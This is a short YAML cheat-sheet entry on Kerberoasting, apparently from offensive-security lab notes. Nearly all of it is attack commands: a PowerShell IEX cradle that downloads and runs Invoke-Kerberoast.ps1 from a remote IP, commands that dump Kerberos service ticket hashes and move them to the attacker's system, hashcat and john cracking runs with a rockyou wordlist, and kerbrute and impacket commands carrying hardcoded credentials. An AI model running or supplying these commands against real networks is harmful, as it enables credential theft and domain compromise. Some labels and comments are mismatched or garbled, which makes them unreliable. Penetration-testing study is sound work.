---
functions:
  privilege-escalation:
    - description: Execute a function, script, or application as another user
      code: |
        (1) IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.119.174/Invoke-Kerberoast.ps1'))
        (2) Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb.txt
        (3) Transfer the file over to attacker's system for cracking
        (4) Choose the account you want to crack and make into a unique file (for speed purposes)
        (5) hashcat -m 13100 sqlserver.kb /usr/share/wordlists/rockyou.txt --force

    - description: With impacket
      code: |
        kerbrute userenum -d controller.local --dc dc.controller.local --downgrade User.txt  # check if pre-auth is disabled using so can request his TGT key
        john user3.hash --wordlist=/usr/share/wordlists/rockyou.txt
        impacket-GetUserSPNs controller.local/user3:Password3 -dc-ip 10.10.156.127 -request   # try to crack the kerberoasted accounts
        

resources: |
  https://www.pentestpartners.com/security-blog/how-to-kerberoast-like-a-boss/
  https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1
---
